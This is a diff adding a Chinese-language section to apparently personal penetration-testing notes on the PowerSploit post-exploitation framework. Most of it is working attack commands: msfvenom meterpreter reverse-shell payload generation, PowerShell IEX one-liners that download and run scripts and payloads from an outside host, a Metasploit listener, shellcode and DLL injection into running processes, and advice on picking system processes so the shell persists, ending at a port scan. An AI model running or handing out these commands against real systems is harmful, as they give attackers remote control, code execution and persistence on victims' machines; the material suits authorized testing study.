@@ -4618,7 +4618,126 @@ PowerSploit是一款基于PowerShell的后渗透（Post-Exploitation）框架软
 git clone https://github.com/PowerShellMafia/PowerSploit
 ```
 
+文件格式
 
+![image-20210325080657807](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210325080657807.png)
+
+
+
+#### PowerSploit各模块的功能
+
+| 模块               | 功能                                 |
+| ------------------ | ------------------------------------ |
+| AntivirusBypass    | **发现杀毒软件**的查杀特征           |
+| CodeExecution      | 在目标主机上**执行代码**             |
+| Exfiltration       | 目标主机上的**信息搜集**工具         |
+| Mayhem             | **蓝屏**等破坏性脚本                 |
+| Persistence        | 后门脚本（**持久性控制**）           |
+| Recon              | 以目标主机为**跳板**进行内网信息侦查 |
+| ScriptModification | 在目标主机上**创建或修改脚本**       |
+| Privesc            | 在目标主机中用于**提权**             |
+
+
+
+
+
+#### CodeExecution模块
+
+##### a) 调用Invoke-Shellcode将反弹Shell注入到本地的PowerShell
+
+首先利用msfvenom生成一个反弹木马，来让invoke-shellcode注入该木马
+
+```
+msfvenom -a x64 -p windows/x64/meterpreter_reverse_tcp lhost=192.168.163.141 lport=4444 -f powershell -o  code
+```
+
+我们直接在目标机器的PowerShell中进行操作，通过IEX下载调用invoke-shellcode以及生成的反弹马
+
+```
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")
+
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/code")
+```
+
+接着在kali中打开Metasploit并设置好监听，接收反弹Shell
+
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.163.141
+set LPORT 4444
+run
+```
+
+我们在目标机器的PowerShell运行
+
+```
+Invoke-Shellcode -Shellcode $buf -Force
+```
+
+可以看到我们反弹Shell成功了
+
+![image-20210325085953490](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210325085953490.png)
+
+**注意：若此处关闭PowerShell，那么连接也将终断，因为承载木马的PowerShell被关闭了。**
+
+
+
+##### b) 调用invoke-shellcode将shellcode注入到指定的进程中
+
+前面步骤和a的步骤一致，唯一不同的就是在最后的命令上，首先，查看我们需要注入的进程，建议可注入到系统的进程，因为一旦进程关闭，那么监听也将终断，因此系统进程一般不会被关闭，注意：不能注入到像360等驱动中，不然会被强制关闭。
+
+```
+Get-Process
+```
+
+![image-20210325090744880](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210325090744880.png)
+
+```
+Invoke-Shellcode -Shellcode $buf -ProcessID 3552 -Force
+```
+
+**注意：和a类似的，若关闭notepad进程，则连接中断**
+
+
+
+##### c) 调用invoke-dllinjection将DLL注入到进程中
+
+通过msfvenom生成DLL的反弹木马，并下载到目标主机中（为了方便，直接将dll文件下载至powershell运行的桌面），在实际环境中，也可以通过该方法进行传输dll文件
+
+```
+msfvenom -a x64 -p windows/x64/meterpreter_reverse_tcp lhost=192.168.163.141 lport=4444 -f dll -o  code.dell
+```
+
+下面就和前面类似，开启监听，PowerShell的IEX执行两个下载
+
+```
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")
+
+IEX(New-Object Net.WebClient).DownloadString("http://47.111.139.22:2333/code.dll")
+```
+
+通过IEX调用下载并调用invoke-dllinjection，将DLL文件直接注入到notepad进程中
+
+```
+Invoke-DllInjection -Dll .\code.dll -ProcessID 3552
+```
+
+
+
+
+
+#### Recon模块
+
+##### a) 调用invoke-Portscan扫描内网主机的端口
+
+通过IEX下载并调用invoke-portscan
+
+```
+IEX(New-Object Net.WebClient net.webclient).DownloadString("http://47.111.139.22:2333/PowerSploit/Recon/Invoke-Portscan.ps1")
+```
+
+**注意：这里用的全端口扫描，不建议这么做，耗费时间太长，可以扫描一些常规端口**
 
 
 
